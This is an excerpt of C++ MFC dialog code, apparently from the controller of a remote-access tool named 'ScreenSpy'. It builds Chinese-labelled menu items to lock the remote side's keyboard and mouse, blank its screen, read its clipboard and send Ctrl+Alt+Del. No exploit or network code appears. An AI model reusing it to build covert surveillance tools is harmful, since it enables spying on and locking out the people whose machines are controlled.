...
BOOL CScreenSpyDlg::OnInitDialog() 
{
	...
	if (pSysMenu != NULL)
	{
		...
		pSysMenu->AppendMenu(MF_STRING, IDM_TOPMOST, "屏幕窗口置顶");
		pSysMenu->AppendMenu(MF_STRING, IDM_CTRL_ALT_DEL, "发送Ctrl+Alt+Del");
		pSysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, "跟踪服务端鼠标");
		pSysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, "锁定服务端鼠标和键盘");
		pSysMenu->AppendMenu(MF_STRING, IDM_BLANK_SCREEN, "服务端黑屏");
		pSysMenu->AppendMenu(MF_STRING, IDM_CAPTURE_LAYER, "捕捉层(导致鼠标闪烁)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, "保存快照");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, "获取剪贴板");
		pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, "设置剪贴板");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_AERO_DISABLE, "禁用桌面合成");
		pSysMenu->AppendMenu(MF_STRING, IDM_AERO_ENABLE, "启用桌面合成");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_ALGORITHM_HOME, "家用办公算法");
		pSysMenu->AppendMenu(MF_STRING, IDM_ALGORITHM_XVID, "影视娱乐算法");
		pSysMenu->AppendMenu(MF_SEPARATOR);
 	//	pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_1,       "黑白屏幕");//1 位黑白(&A)
	//	pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_4_GRAY,  "游戏屏幕");//4 位灰度(&B)
...
// 		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_8_COLOR, "8 位彩色(&E)");
		pSysMenu->AppendMenu(MF_STRING|MF_GRAYED, IDM_DEEP_16, "游戏屏幕");//16位增强颜色(&U)
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_32, "超清屏幕");  //32位真彩颜色(&R)
